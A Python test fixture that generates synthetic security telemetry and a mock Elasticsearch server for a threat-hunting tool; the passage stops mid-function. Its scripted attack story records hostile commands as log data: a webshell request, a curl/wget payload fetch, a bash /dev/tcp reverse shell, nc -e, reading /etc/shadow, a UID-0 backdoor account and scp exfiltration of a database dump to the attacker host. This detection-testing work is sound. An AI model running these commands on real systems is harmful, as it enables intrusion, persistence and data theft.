"""A synthetic multi-source telemetry set and an in-memory Elasticsearch that serves it.

The records cover every normalizer family the sweep reads (audit exec, socket, file, login and admin groups with
their journald copies, journald sshd/sudo/systemd/kernel records, Apache access and error, every Suricata event
type, Arkime sessions) plus malformed records, an attack story that produces findings and expansion links, and
dense bursts that force partition splits and capped fetches. `MiniES` answers the read-only calls the sweep and the
pivots make through the real `ElasticClient`: PIT open/close, PIT searches with search_after, date histograms,
composite aggregations and the bool/term/terms/range/exists/prefix/wildcard clauses the compiler emits.
"""
from __future__ import annotations

import bisect
import hashlib
import json
import random
from datetime import UTC, datetime, timedelta
from fnmatch import fnmatchcase
from urllib.parse import urlparse

import httpx

T0 = datetime(2024, 11, 18, 14, 0, tzinfo=UTC)
HOST_TARGET = "romulus-host-x"
NETWORK_TARGET = "romulus-network-x"
ARKIME_TARGET = "arkime_sessions3-x"
ATTACKER = "203.0.113.8"
HOSTS = {"web1": "10.0.0.10", "db1": "10.0.0.20", "fw1": "10.0.0.1"}
BOOTS = {"web1": "a1" * 16, "db1": "b2" * 16, "fw1": "c3" * 16}

HOST_TYPES = {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword", "host.ip": "ip",
              "source.ip": "ip",
              "destination.ip": "ip", "destination.port": "integer", "process.pid": "integer",
              "process.session_id": "integer", "user.name": "keyword", "url.original": "keyword",
              "http.response.status_code": "long"}
NETWORK_TYPES = {"@timestamp": "date", "event.dataset": "keyword", "host.name": "keyword", "source.ip": "ip",
                 "destination.ip": "ip", "source.port": "integer", "destination.port": "integer",
                 "network.community_id": "keyword", "network.transport": "keyword"}
ARKIME_TYPES = {"firstPacket": "date", "lastPacket": "date", "source.ip": "ip", "destination.ip": "ip",
                "source.port": "integer", "destination.port": "integer", "network.community_id": "keyword",
                "protocol": "keyword", "node": "keyword", "ipProtocol": "integer"}


def _iso(value: datetime) -> str:
    return value.astimezone(UTC).isoformat().replace("+00:00", "Z")


def _ms(value: datetime) -> int:
    return round(value.timestamp() * 1000)


def _hex(text: str) -> str:
    return text.encode().hex().upper()


def _cid(src: str, sport: int, dst: str, dport: int) -> str:
    return "1:" + hashlib.sha1(f"{src}|{sport}|{dst}|{dport}".encode()).hexdigest()[:20] + "="


def _saddr(ip: str, port: int) -> str:
    return "0200" + f"{port:04X}" + "".join(f"{int(octet):02X}" for octet in ip.split(".")) + "0" * 16


class Builder:
    """Builds the records in time order per source; every document id is unique."""

    def __init__(self, seed: int):
        self.rng = random.Random(seed)
        self.host: list[dict] = []
        self.network: list[dict] = []
        self.arkime: list[dict] = []
        self.serial = {name: 1000 for name in HOSTS}
        self.pid = {name: 2000 for name in HOSTS}
        self.n = 0

    def _id(self, prefix: str) -> str:
        self.n += 1
        return f"{prefix}-{self.n:07d}"

    # ---- host records ----------------------------------------------------------------------------------
    def _doc(self, host: str, ts: datetime, dataset: str, original: str | None, **extra) -> dict:
        source = {"@timestamp": _iso(ts), "event": {"dataset": dataset}, "host": {"name": host, "ip": [HOSTS[host]]},
                  **extra}
        if original is not None:
            source["event"]["original"] = original
        doc = {"_index": HOST_TARGET, "_id": self._id(dataset.replace(".", "-")), "_source": source}
        self.host.append(doc)
        return doc

    def _audit(self, host: str, ts: datetime, serial: int, kind: str, body: str, *, copy: bool = True,
               enriched: str = "") -> None:
        stamp = f"{ts.timestamp():.3f}"
        text = f"type={kind} msg=audit({stamp}:{serial}): {body}" + (f"\x1d{enriched}" if enriched else "")
        self._doc(host, ts, "linux.audit", text, message=text)
        if copy:
            micros = _ms(ts) * 1000
            journal = {"_TRANSPORT": "audit", "_AUDIT_ID": str(serial), "_AUDIT_TYPE_NAME": kind,
                       "_SOURCE_REALTIME_TIMESTAMP": str(micros), "__REALTIME_TIMESTAMP": str(micros + 1500),
                       "_BOOT_ID": BOOTS[host], "_HOSTNAME": host, "MESSAGE": text.split(": ", 1)[1]}
            self._doc(host, ts + timedelta(milliseconds=2), "systemd.journal", json.dumps(journal, sort_keys=True))

    def exec_group(self, host: str, ts: datetime, argv: list[str], *, exe: str | None = None, uid: int = 0,
                   ppid: int | None = None, ses: int = 4, cwd: str = "/root", success: bool = True,
                   copy: bool = True, tty: str = "pts0") -> int:
        self.serial[host] += 1
        self.pid[host] += 1
        serial, pid = self.serial[host], self.pid[host]
        exe = exe or argv[0]
        user = {0: "root", 33: "www-data", 1000: "alice"}.get(uid, "nobody")
        self._audit(host, ts, serial, "SYSCALL",
                    f'arch=c000003e syscall=59 success={"yes" if success else "no"} exit={0 if success else -2} '
                    f'a0=55d0 a1=55d1 a2=55d2 a3=0 items=2 ppid={ppid or pid - 1} pid={pid} auid={uid} uid={uid} '
                    f'gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} sgid={uid} fsgid={uid} tty={tty} '
                    f'ses={ses} comm="{exe.rsplit("/", 1)[-1][:15]}" exe="{exe}" key=(null)',
                    copy=copy, enriched=f'ARCH=x86_64 SYSCALL=execve AUID="{user}" UID="{user}" GID="{user}" '
                                        f'EUID="{user}"')
        args = " ".join(f'a{i}="{a}"' if " " not in a and '"' not in a else f"a{i}={_hex(a)}"
                        for i, a in enumerate(argv))
        self._audit(host, ts, serial, "EXECVE", f"argc={len(argv)} {args}", copy=copy)
        self._audit(host, ts, serial, "CWD", f'cwd="{cwd}"', copy=copy)
        self._audit(host, ts, serial, "PATH", f'item=0 name="{exe}" inode={4000 + serial % 97} dev=08:01 '
                                              f'mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL',
                    copy=copy, enriched='OUID="root" OGID="root"')
        self._audit(host, ts, serial, "PROCTITLE", f"proctitle={_hex(chr(0).join(argv))}", copy=copy)
        return pid

    def connect(self, host: str, ts: datetime, ip: str, port: int, *, exe: str, uid: int = 0,
                pid: int | None = None, success: bool = True) -> None:
        self.serial[host] += 1
        serial = self.serial[host]
        pid = pid or self.pid[host]
        self._audit(host, ts, serial, "SYSCALL",
                    f'arch=c000003e syscall=42 success={"yes" if success else "no"} '
                    f'exit={0 if success else -115} a0=3 a1=7ffd a2=10 a3=0 items=0 ppid={pid - 1} pid={pid} '
                    f'auid={uid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} egid={uid} sgid={uid} '
                    f'fsgid={uid} tty=(none) ses=4 comm="{exe.rsplit("/", 1)[-1]}" exe="{exe}" key=(null)')
        self._audit(host, ts, serial, "SOCKADDR", f"saddr={_saddr(ip, port)}")
        self._audit(host, ts, serial, "PROCTITLE", f"proctitle={_hex(exe)}")

    def file_change(self, host: str, ts: datetime, path: str, *, exe: str = "/usr/bin/vi", uid: int = 0) -> None:
        self.serial[host] += 1
        self.pid[host] += 1
        serial, pid = self.serial[host], self.pid[host]
        directory = path.rsplit("/", 1)[0] or "/"
        self._audit(host, ts, serial, "SYSCALL",
                    f'arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=55d0 a2=241 a3=1b6 items=2 '
                    f'ppid={pid - 1} pid={pid} auid={uid} uid={uid} gid={uid} euid={uid} suid={uid} fsuid={uid} '
                    f'egid={uid} sgid={uid} fsgid={uid} tty=pts0 ses=4 comm="{exe.rsplit("/", 1)[-1]}" '
                    f'exe="{exe}" key="watch"')
        self._audit(host, ts, serial, "CWD", 'cwd="/root"')
        self._audit(host, ts, serial, "PATH", f'item=0 name="{directory}" inode=11 dev=08:01 mode=040755 ouid=0 '
                                              f'ogid=0 rdev=00:00 nametype=PARENT')
        self._audit(host, ts, serial, "PATH", f'item=1 name="{path}" inode=12 dev=08:01 mode=0100644 ouid=0 '
                                              f'ogid=0 rdev=00:00 nametype=CREATE')

    def login(self, host: str, ts: datetime, user: str, addr: str) -> None:
        for kind in ("USER_LOGIN", "USER_START"):
            self.serial[host] += 1
            self._audit(host, ts, self.serial[host], kind,
                        f"pid=900 uid=0 auid=1000 ses=7 msg='op=login acct=\"{user}\" exe=\"/usr/sbin/sshd\" "
                        f"hostname=? addr={addr} terminal=ssh res=success'")

    def admin(self, host: str, ts: datetime, user: str) -> None:
        self.serial[host] += 1
        self._audit(host, ts, self.serial[host], "ADD_USER",
                    f"pid=901 uid=0 auid=0 ses=4 msg='op=adding user id=1001 exe=\"/usr/sbin/useradd\" "
                    f"hostname=? addr=? terminal=pts/0 res=success acct=\"{user}\"'")

    def journal(self, host: str, ts: datetime, ident: str, message: str, **fields) -> None:
        micros = _ms(ts) * 1000
        record = {"SYSLOG_IDENTIFIER": ident, "MESSAGE": message, "_HOSTNAME": host, "_BOOT_ID": BOOTS[host],
                  "__REALTIME_TIMESTAMP": str(micros), **fields}
        self._doc(host, ts, "systemd.journal", json.dumps(record, sort_keys=True))

    def apache(self, host: str, ts: datetime, ip: str, url: str, status: int, method: str = "GET") -> None:
        self._doc(host, ts, "apache.access", None, source={"ip": ip}, url={"original": url},
                  http={"request": {"method": method}, "response": {"status_code": status}},
                  user_agent={"original": "Mozilla/5.0"})

    def apache_error(self, host: str, ts: datetime, ip: str, message: str) -> None:
        self._doc(host, ts, "apache.error", None, source={"ip": ip}, message=message)

    # ---- network records -------------------------------------------------------------------------------
    def eve(self, ts: datetime, event_type: str, src: str, sport: int, dst: str, dport: int, proto: str = "TCP",
            sensor: str = "fw1", **body) -> None:
        flow_id = self.rng.randrange(10**12, 10**13)
        eve = {"timestamp": _iso(ts), "event_type": event_type, "src_ip": src, "src_port": sport, "dest_ip": dst,
               "dest_port": dport, "proto": proto, "flow_id": flow_id,
               "community_id": _cid(src, sport, dst, dport), **body}
        source = {"@timestamp": _iso(ts), "event": {"dataset": f"suricata.eve.{event_type}",
                                                    "original": json.dumps(eve, sort_keys=True)},
                  "host": {"name": sensor}, "source": {"ip": src, "port": sport},
                  "destination": {"ip": dst, "port": dport}, "network": {"transport": proto.lower()}}
        self.network.append({"_index": NETWORK_TARGET, "_id": self._id(f"eve-{event_type}"), "_source": source})

    def flow(self, ts: datetime, src: str, sport: int, dst: str, dport: int, *, seconds: float = 2.0,
             app: str | None = None, state: str = "closed", to_server: int = 600, to_client: int = 1400,
             proto: str = "TCP") -> None:
        start, end = ts, ts + timedelta(seconds=seconds)
        body = {"flow": {"pkts_toserver": 6, "pkts_toclient": 5, "bytes_toserver": to_server,
                         "bytes_toclient": to_client, "start": _iso(start), "end": _iso(end), "age": int(seconds),
                         "state": state, "reason": "timeout", "alerted": False}}
        if app:
            body["app_proto"] = app
        self.eve(end, "flow", src, sport, dst, dport, proto=proto, **body)

    def session(self, ts: datetime, src: str, sport: int, dst: str, dport: int, *, seconds: float = 2.0,
                protocols: tuple[str, ...] = ("tcp",), **extra) -> None:
        first = _ms(ts)
        source = {"firstPacket": first, "lastPacket": first + int(seconds * 1000), "ipProtocol": 6,
                  "node": "sensor1", "protocol": list(protocols),
                  "source": {"ip": src, "port": sport, "bytes": 700, "packets": 6},
                  "destination": {"ip": dst, "port": dport, "bytes": 1500, "packets": 5},
                  "network": {"community_id": _cid(src, sport, dst, dport)},
                  "tcpflags": {"syn": 1, "syn-ack": 1, "ack": 4, "psh": 2, "fin": 1, "rst": 0, "urg": 0},
                  **extra}
        self.arkime.append({"_index": ARKIME_TARGET, "_id": self._id("arkime"), "_source": source})


def build(scale: int = 1, seed: int = 7) -> dict[str, list[dict]]:
    """Records for the three targets. `scale` multiplies the background volume; the attack story is fixed."""
    b = Builder(seed)
    rng = b.rng
    benign = [["/usr/bin/ls", "-la", "/var/log"], ["/usr/bin/cat", "/var/log/syslog"],
              ["/usr/bin/systemctl", "status", "apache2"], ["/bin/ps", "aux"], ["/usr/bin/df", "-h"],
              ["/usr/bin/grep", "-r", "error", "/var/log/apache2"], ["/usr/bin/python3", "/opt/app/report.py"],
              ["/usr/bin/tar", "czf", "/backup/www.tgz", "/var/www"], ["/usr/bin/find", "/tmp", "-mtime", "+7"]]
    # boots: the kernel banner opens each host's boot before any record of it
    for host in HOSTS:
        b.journal(host, T0 - timedelta(minutes=50), "kernel", "Linux version 6.8.0-45-generic (buildd@lcy02)",
                  _TRANSPORT="kernel", SYSLOG_FACILITY="0")
    # background host activity over the window
    for i in range(400 * scale):
        host = ("web1", "db1", "fw1")[i % 3]
        ts = T0 - timedelta(minutes=45) + timedelta(seconds=i * 13.7 / scale)
        argv = benign[rng.randrange(len(benign))]
        # every ninth exec has no journald copies: its boot comes from the boot-interval map, or stays unknown
        b.exec_group(host, ts, argv, uid=rng.choice((0, 1000)), ses=rng.choice((3, 4, 9)), copy=i % 9 != 0)
        if i % 7 == 0:
            b.journal(host, ts + timedelta(seconds=1), "systemd", "Started Session 9 of User alice.",
                      UNIT="session-9.scope", JOB_TYPE="start", JOB_RESULT="done")
        if i % 5 == 0:
            b.apache("web1", ts, f"192.0.2.{rng.randrange(2, 200)}", f"/index.html?p={i}", 200)
        if i % 11 == 0:
            b.connect(host, ts + timedelta(milliseconds=300), "10.0.0.53", 53, exe="/usr/lib/systemd/resolved")
        if i % 13 == 0:
            src = HOSTS[host]
            b.flow(ts, src, 40000 + i % 20000, "10.0.0.53", 53, proto="UDP", app="dns")
            b.eve(ts, "dns", src, 40000 + i % 20000, "10.0.0.53", 53, proto="UDP",
                  dns={"type": "query", "rrname": f"host{i % 17}.corp.example", "rrtype": "A", "id": i})
            b.session(ts, src, 40000 + i % 20000, "10.0.0.53", 53, protocols=("udp", "dns"))
        if i % 17 == 0:
            src = HOSTS[host]
            b.flow(ts, src, 50000 + i % 10000, "198.51.100.20", 443, app="tls", seconds=4.0)
            b.eve(ts, "tls", src, 50000 + i % 10000, "198.51.100.20", 443,
                  tls={"sni": "updates.example.net", "version": "TLS 1.3", "ja3": {"hash": "e7d705a3286e19ea"}})
            b.session(ts, src, 50000 + i % 10000, "198.51.100.20", 443, protocols=("tcp", "tls"), seconds=4.0)
        if i % 29 == 0:
            b.file_change(host, ts + timedelta(seconds=2), f"/etc/app/conf{i % 5}.ini")
        if i % 31 == 0:
            b.eve(ts, "netflow", HOSTS[host], 33000 + i % 1000, "10.0.0.53", 53, proto="UDP",
                  netflow={"pkts": 2, "bytes": 140, "start": _iso(ts), "end": _iso(ts), "age": 0})
    # a record that is not audit text, and one with no event.original: errors, never dropped
    b._doc("db1", T0 - timedelta(minutes=10), "linux.audit", "this is not an audit record")
    b._doc("fw1", T0 - timedelta(minutes=9), "systemd.journal", None, message="no structured record")
    # ---- the attack story on web1 then db1 ----------------------------------------------------------------
    at = T0 + timedelta(minutes=5)
    for n in range(60):                       # a web scan: many 404s from one source
        b.apache("web1", at + timedelta(seconds=n * 0.5), ATTACKER, f"/admin{n}.php", 404)
    b.apache("web1", at + timedelta(seconds=40), ATTACKER, "/uploads/shell.php?cmd=id", 200, method="POST")
    b.apache_error("web1", at + timedelta(seconds=41), ATTACKER, "PHP Warning: system(): Unable to fork")
    b.eve(at + timedelta(seconds=40), "alert", ATTACKER, 51515, HOSTS["web1"], 80,
          alert={"signature": "ET WEB_SERVER WebShell Generic - wget http - POST", "signature_id": 2016184,
                 "severity": 1, "category": "Web Application Attack", "action": "allowed"}, app_proto="http")
    b.eve(at + timedelta(seconds=40), "http", ATTACKER, 51515, HOSTS["web1"], 80,
          http={"hostname": "web1", "url": "/uploads/shell.php?cmd=id", "http_method": "POST", "status": 200,
                "http_user_agent": "curl/8.0", "length": 120}, app_proto="http")
    b.session(at + timedelta(seconds=40), ATTACKER, 51515, HOSTS["web1"], 80, protocols=("tcp", "http"),
              http={"host": ["web1"], "uri": ["/uploads/shell.php?cmd=id"], "method": ["POST"],
                    "statuscode": [200], "useragent": ["curl/8.0"]})
    t = at + timedelta(seconds=42)
    shell = b.exec_group("web1", t, ["/bin/sh", "-c", "id; uname -a"], uid=33, ses=4294967295, cwd="/var/www",
                         ppid=812, tty="(none)")
    b.exec_group("web1", t + timedelta(seconds=1), ["/usr/bin/id"], uid=33, ppid=shell, ses=4294967295,
                 cwd="/var/www", tty="(none)")
    b.exec_group("web1", t + timedelta(seconds=3), ["/usr/bin/curl", "-s", f"http://{ATTACKER}/x.sh", "-o",
                                                    "/tmp/.x.sh"], uid=33, ppid=shell, ses=4294967295,
                 cwd="/tmp", tty="(none)")
    b.connect("web1", t + timedelta(seconds=3, milliseconds=200), ATTACKER, 80, exe="/usr/bin/curl", uid=33)
    b.flow(t + timedelta(seconds=3), HOSTS["web1"], 41000, ATTACKER, 80, app="http")
    b.exec_group("web1", t + timedelta(seconds=5), ["/usr/bin/chmod", "+x", "/tmp/.x.sh"], uid=33, ppid=shell,
                 ses=4294967295, cwd="/tmp", tty="(none)")
    rev = b.exec_group("web1", t + timedelta(seconds=7), ["/bin/bash", "-c",
                                                         f"bash -i >& /dev/tcp/{ATTACKER}/4444 0>&1"],
                       uid=33, ppid=shell, ses=4294967295, cwd="/tmp", tty="(none)")
    b.connect("web1", t + timedelta(seconds=7, milliseconds=100), ATTACKER, 4444, exe="/bin/bash", uid=33, pid=rev)
    b.flow(t + timedelta(seconds=7), HOSTS["web1"], 42424, ATTACKER, 4444, seconds=600.0, state="established",
           to_server=90000, to_client=4000)
    b.session(t + timedelta(seconds=7), HOSTS["web1"], 42424, ATTACKER, 4444, seconds=600.0)
    b.exec_group("web1", t + timedelta(seconds=20), ["/usr/bin/cat", "/etc/shadow"], uid=0, ppid=rev,
                 ses=4294967295, tty="(none)")
    b.exec_group("web1", t + timedelta(seconds=25), ["/usr/bin/nc", "-e", "/bin/sh", ATTACKER, "4445"], uid=0,
                 ppid=rev, ses=4294967295, tty="(none)")
    b.exec_group("web1", t + timedelta(seconds=30), ["/usr/sbin/iptables", "-F"], uid=0, ppid=rev,
                 ses=4294967295, tty="(none)")
    b.exec_group("web1", t + timedelta(seconds=33), ["/usr/sbin/useradd", "-m", "-o", "-u", "0", "backdoor"], uid=0,
                 ppid=rev, ses=4294967295, tty="(none)")
    b.admin("web1", t + timedelta(seconds=33), "backdoor")
    b.exec_group("web1", t + timedelta(seconds=36), ["/usr/bin/crontab", "/tmp/.cron"], uid=0, ppid=rev,
                 ses=4294967295, tty="(none)")
    b.file_change("web1", t + timedelta(seconds=37), "/var/spool/cron/crontabs/root", exe="/usr/bin/crontab")
    b.exec_group("web1", t + timedelta(seconds=40), ["/usr/bin/ssh", "root@10.0.0.20"], uid=0, ppid=rev,
                 ses=4294967295, tty="(none)")
    b.connect("web1", t + timedelta(seconds=40, milliseconds=50), HOSTS["db1"], 22, exe="/usr/bin/ssh")
    b.flow(t + timedelta(seconds=40), HOSTS["web1"], 43000, HOSTS["db1"], 22, app="ssh", seconds=300.0)
    b.eve(t + timedelta(seconds=40), "ssh", HOSTS["web1"], 43000, HOSTS["db1"], 22,
          ssh={"client": {"software_version": "OpenSSH_9.6", "hassh": {"hash": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}},
               "server": {"software_version": "OpenSSH_8.9"}}, app_proto="ssh")
    # lateral movement onto db1
    d = t + timedelta(seconds=42)
    b.journal("db1", d, "sshd", f"Accepted password for root from {HOSTS['web1']} port 43000 ssh2",
              _COMM="sshd", _SYSTEMD_UNIT="ssh.service")
    b.login("db1", d, "root", HOSTS["web1"])
    b.journal("db1", d + timedelta(seconds=1), "sshd", f"Accepted password for alice from {ATTACKER} port 50111 ssh2",
              _COMM="sshd", _SYSTEMD_UNIT="ssh.service")
    b.journal("db1", d + timedelta(seconds=5), "sudo",
              "  alice : TTY=pts/1 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash", _COMM="sudo")
    b.exec_group("db1", d + timedelta(seconds=10), ["/usr/bin/wget", f"http://{ATTACKER}/m", "-O", "/dev/shm/m"],
                 uid=0, ses=12)
    b.connect("db1", d + timedelta(seconds=10, milliseconds=100), ATTACKER, 80, exe="/usr/bin/wget")
    b.exec_group("db1", d + timedelta(seconds=14), ["/usr/bin/mysqldump", "--all-databases"], uid=0, ses=12)
    b.exec_group("db1", d + timedelta(seconds=20), ["/usr/bin/scp", "/tmp/all.sql", f"root@{ATTACKER}:/x"],
                 uid=0, ses=12)
    b.connect("db1", d + timedelta(seconds=20, milliseconds=60), ATTACKER, 22, exe="/usr/bin/scp")
    b.flow(d + timedelta(seconds=20), HOSTS["db1"], 44000, ATTACKER, 22, app="ssh", seconds=40.0,
           to_server=5_000_000, to_client=9000)
    b.session(d + timedelta(seconds=20), HOSTS["db1"], 44000, ATTACKER, 22, seconds=40.0, protocols=("tcp", "ssh"))
    b.eve(d + timedelta(seconds=25), "fileinfo", ATTACKER, 80, HOSTS["db1"], 47000,
          fileinfo={"filename": "/m", "magic": "ELF 64-bit LSB executable", "size": 81234, "state": "CLOSED",
                    "stored": False}, app_proto="http")
    b.eve(d + timedelta(seconds=26), "dns", HOSTS["db1"], 47001, "10.0.0.53", 53, proto="UDP",
          dns={"type": "query", "rrname": "c2-beacon.evil.example", "rrtype": "TXT", "id": 77})
    # ---- dense bursts: a port scan (network) and an audit flood (host) that force partition splits --------
    burst = T0 + timedelta(minutes=20)
    for port in range(1, 1 + 1500 * scale):
        b.flow(burst + timedelta(milliseconds=port * 40 // scale), ATTACKER, 60000, HOSTS["db1"], port % 65535 or 1,
               seconds=0.0, state="new", to_server=60, to_client=0)
    for port in range(1, 1 + 300 * scale):
        b.session(burst + timedelta(milliseconds=port * 150 // scale), ATTACKER, 60001, HOSTS["db1"],
                  port % 65535 or 1, seconds=0.0)
    flood = T0 + timedelta(minutes=35)
    for i in range(300 * scale):
        b.exec_group("fw1", flood + timedelta(milliseconds=i * 150 // scale), ["/usr/sbin/iptables", "-L", "-n"],
                     uid=0, ses=5)
    return {HOST_TARGET: b.host, NETWORK_TARGET: b.network, ARKIME_TARGET: b.arkime}


# ---- the in-memory Elasticsearch ------------------------------------------------------------------------------

def _path(source: dict, field: str):
    value = source
    for part in field.split("."):
        if not isinstance(value, dict):
            return None
        value = value.get(part)
    return value


def _ns(value) -> int | None:
    if value is None:
        return None
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return int(value) * 1_000_000
    text = str(value)
    if text.isdigit():
        return int(text) * 1_000_000
    when = datetime.fromisoformat(text)
    if when.tzinfo is None:
        when = when.replace(tzinfo=UTC)
    return round(when.timestamp() * 1_000_000) * 1000


def _ns_text(value: int) -> str:
    seconds, nanos = divmod(value, 1_000_000_000)
    return f"{datetime.fromtimestamp(seconds, UTC):%Y-%m-%dT%H:%M:%S}.{nanos:09d}Z"


def _values(source: dict, field: str) -> list:
    value = _path(source, field)
    if value is None:
        return []
    return value if isinstance(value, list) else [value]


def _matches(clause: dict, source: dict, time_field: str) -> bool:
    (kind, spec), = clause.items()
    if kind == "bool":
        if not all(_matches(c, source, time_field) for c in spec.get("filter", []) + spec.get("must", [])):
            return False
        if any(_matches(c, source, time_field) for c in spec.get("must_not", [])):
            return False
        should = spec.get("should", [])
        return not should or sum(_matches(c, source, time_field) for c in should) >= spec.get(
            "minimum_should_match", 1)
    if kind == "range":
        (field, bounds), = spec.items()
        value = _ns(_path(source, field))
        if value is None:
            return False
        if "gte" in bounds and value < _ns(bounds["gte"]):
            return False
        return not ("lt" in bounds and value >= _ns(bounds["lt"]))
    if kind == "term":
        (field, wanted), = spec.items()
        return any(str(v) == str(wanted) for v in _values(source, field))
    if kind == "terms":
        (field, wanted), = spec.items()
        wanted = {str(w) for w in wanted}
        return any(str(v) in wanted for v in _values(source, field))
    if kind == "exists":
        return bool(_values(source, spec["field"]))
    if kind == "prefix":
        (field, wanted), = spec.items()
        return any(str(v).startswith(wanted["value"]) for v in _values(source, field))
    if kind == "wildcard":
        (field, wanted), = spec.items()
        pattern = wanted["value"].lower() if wanted.get("case_insensitive") else wanted["value"]
        return any(fnmatchcase(str(v).lower() if wanted.get("case_insensitive") else str(v), pattern)
                   for v in _values(source, field))
    raise AssertionError(f"MiniES: unsupported clause {kind}")


class MiniES:
    """Serves `docs` per target. Records are kept in time order; each search filters by the query's time range
    first (bisect), then evaluates the rest of the query on each record."""

    def __init__(self, docs: dict[str, list[dict]], time_fields: dict[str, str]):
        self.time_fields = time_fields
        self.index: dict[str, list[tuple[int, int, dict]]] = {}
        for target, items in docs.items():
            field = time_fields[target]
            rows = [(_ns(_path(doc["_source"], field)), n, doc) for n, doc in enumerate(items)]
            rows.sort(key=lambda row: (row[0], row[1]))
            self.index[target] = rows
        self.pits: dict[str, str] = {}
        self.requests = 0

    def transport(self) -> httpx.MockTransport:
        return httpx.MockTransport(self)

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.requests += 1
        path = urlparse(str(request.url)).path
        body = json.loads(request.content) if request.content else {}
        if request.method == "GET" and path == "/":
            return httpx.Response(200, json={"version": {"number": "8.15.0"}})
        if request.method == "POST" and path.endswith("/_pit"):
            target = path.split("/")[1]
            pit = f"pit-{len(self.pits)}"
            self.pits[pit] = target
            return httpx.Response(200, json={"id": pit})
        if request.method == "DELETE" and path == "/_pit":
            return httpx.Response(200, json={"succeeded": True, "num_freed": 1})
        if request.method == "POST" and path.endswith("/_search"):
            target = self.pits[body["pit"]["id"]] if path == "/_search" else path.split("/")[1]
            return httpx.Response(200, json=self._search(target, body))
        return httpx.Response(404, json={"error": f"unexpected {request.method} {path}"})

    def _matching(self, target: str, query: dict) -> list[tuple[int, int, dict]]:
        rows = self.index[target]
        field = self.time_fields[target]
        low, high = 0, len(rows)
        for clause in query.get("bool", {}).get("filter", []):
            bounds = clause.get("range", {}).get(field)
            if bounds:
                if "gte" in bounds:
                    low = max(low, bisect.bisect_left(rows, (_ns(bounds["gte"]), -1)))
                if "lt" in bounds:
                    high = min(high, bisect.bisect_left(rows, (_ns(bounds["lt"]), -1)))
        return [row for row in rows[low:high] if _matches(query, row[2]["_source"], field)]

    def _search(self, target: str, body: dict) -> dict:
        rows = self._matching(target, body.get("query", {"bool": {}}))
        out = {"timed_out": False, "_shards": {"total": 1, "successful": 1, "failed": 0},
               "hits": {"total": {"value": len(rows), "relation": "eq"}, "hits": []}}
        aggs = body.get("aggs", {})
        if "h" in aggs:
            out["aggregations"] = {"h": {"buckets": self._histogram(rows, aggs["h"]["date_histogram"])}}
        if "g" in aggs:
            out["aggregations"] = {"g": self._composite(rows, aggs["g"])}
        size = body.get("size", 10)
        if size and "pit" in body:
            out["pit_id"] = body["pit"]["id"]
            order = next(iter(body["sort"][0].values()))["order"]
            keyed = [((row[0], row[1]), row) for row in rows]
            if order == "desc":
                keyed.reverse()
            after = body.get("search_after")
            if after is not None:
                mark = (_ns(after[0]), int(after[1]))
                keyed = [item for item in keyed if (item[0] > mark if order == "asc" else item[0] < mark)]
            for (ns, n), row in keyed[:size]:
                doc = row[2]
                out["hits"]["hits"].append({"_index": doc["_index"], "_id": doc["_id"], "_source": doc["_source"],
                                            "sort": [_ns_text(ns), n]})
        return out

    @staticmethod
    def _histogram(rows, spec: dict) -> list[dict]:
        step = int(spec["fixed_interval"].rstrip("s")) * 1_000_000_000
        low = _ns(spec["extended_bounds"]["min"]) // step * step
        high = _ns(spec["extended_bounds"]["max"])
        counts: dict[int, int] = {}
        for ns, _n, _doc in rows:
            counts[ns // step * step] = counts.get(ns // step * step, 0) + 1
        buckets, key = [], low
        while key < high or key in counts:
            buckets.append({"key_as_string": datetime.fromtimestamp(key / 1e9, UTC).isoformat(),
                            "key": key // 1_000_000, "doc_count": counts.get(key, 0)})
            key += step
        return buckets

    @staticmethod
    def _composite(rows, spec: dict) -> dict:
        sources = spec["composite"]["sources"]
        groups: dict[tuple, list[int]] = {}
        for ns, _n, doc in rows:
            key = tuple(json.dumps(_path(doc["_source"], next(iter(src.values()))["terms"]["field"]))
                        for src in sources)
            groups.setdefault(key, []).append(ns)
        after = spec["composite"].get("after")
        names = [next(iter(src)) for src in sources]
        buckets = []
        for key in sorted(groups):
            values = {name: json.loads(k) for name, k in zip(names, key, strict=True)}
            if after is not None and tuple(json.dumps(after[name]) for name in names) >= key:
                continue
            stamps = groups[key]
            buckets.append({"key": values, "doc_count": len(stamps),
                            "first": {"value_as_string": _ns_text(min(stamps))},
                            "last": {"value_as_string": _ns_text(max(stamps))}})
        page = buckets[:spec["composite"]["size"]]
        return {"buckets": page, **({"after_key": page[-1]["key"]} if page else {})}


# ---- the sweep and expansion stack over the in-memory source --------------------------------------------------

WINDOW_START, WINDOW_END = T0 - timedelta(hours=1), T0 + timedelta(hours=1)
# Small enough that the bursts above are pre-split, and that some split halves are fetched, found capped and split
# again; the leaf cap exercises pivot sampling.
TEST_PARTITION_MAX_DOCS = 400
TEST_PIVOT_RECORDS = 600
_VOLATILE = {"created_at", "updated_at", "retrieved_at", "at", "captured_at", "started_at", "ended_at",
             "heartbeat_at", "lease_until", "lease_owner", "duration_ms"}


def _row(row) -> dict:
    return {k: v for k, v in dict(row).items() if k not in _VOLATILE}


def _strip(value):
    """Drop wall-clock fields (they differ on every run) from nested JSON."""
    if isinstance(value, dict):
        return {k: _strip(v) for k, v in value.items() if k not in _VOLATILE}
    if isinstance(value, list):
        return [_strip(v) for v in value]
    return value


def run_stack(stage_dir, *, scale: int = 1, docs: dict | None = None) -> dict:
    """Sweep every target, finalize, expand from the findings and build the report manifest. Returns a canonical
    snapshot of everything a hunt stores or reports, without wall-clock fields. Callers patch the partition and
    pivot sizes first (`patched_sizes`)."""
    from sqlalchemy import select

    from romulus.config import Settings
    from romulus.hunt import run as hunt_run
    from romulus.hunt.expansion import ExpansionEngine
    from romulus.hunt.links import LinkFetcher
    from romulus.hunt.pivot import PivotExecutor
    from romulus.hunt.sweep import Sweep
    from romulus.report.manifest import build_manifest
    from romulus.sources.es import ElasticClient
    from romulus.sources.models import Window
    from romulus.sources.profile import contract_from_types
    from romulus.store import schema as t
    from romulus.store.db import make_engine, migrate
    from romulus.store.repo import Repo

    docs = docs if docs is not None else build(scale)
    contracts = {HOST_TARGET: contract_from_types(HOST_TARGET, HOST_TYPES),
